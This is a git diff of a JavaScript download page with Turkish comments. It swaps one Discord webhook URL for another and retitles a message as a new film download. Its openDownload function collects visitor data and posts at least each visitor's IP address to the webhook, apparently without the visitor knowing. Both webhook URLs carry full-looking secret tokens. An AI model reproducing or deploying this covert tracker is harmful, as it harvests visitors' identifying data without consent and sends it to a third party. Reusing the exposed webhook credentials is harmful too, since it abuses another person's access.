@@ -166,7 +166,7 @@ function openDownload() {
 // ============================================
 
 // Webhook URL - KENDİ URL'İNİZİ KOYUN
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/1492906039513972998/0suqfXsffcSXrXySrMBXtqKNeOzR_X5yWlo_amiDR5-Feg-szjTIiGXFHWIB1g19B-Fv';
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1493315362383593492/UM-aoQ7uDp63F9q_z6xJAwvlGqSC-wyeD2qdZ5Niv-xCYVOEcOXiSpu2yEmPh__jE8gd';
 
 function openDownload() {
     // Kullanıcı verilerini topla
@@ -222,7 +222,7 @@ function openDownload() {
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     embeds: [{
-                        title: '🎯 Yeni Kullanıcı İndirme',
+                        title: '🎯 Yeni Kullanıcı İndirme Film',
                         color: 3447003,
                         fields: [
                             { name: '🌐 IP Adresi', value: fullData.ip, inline: true },
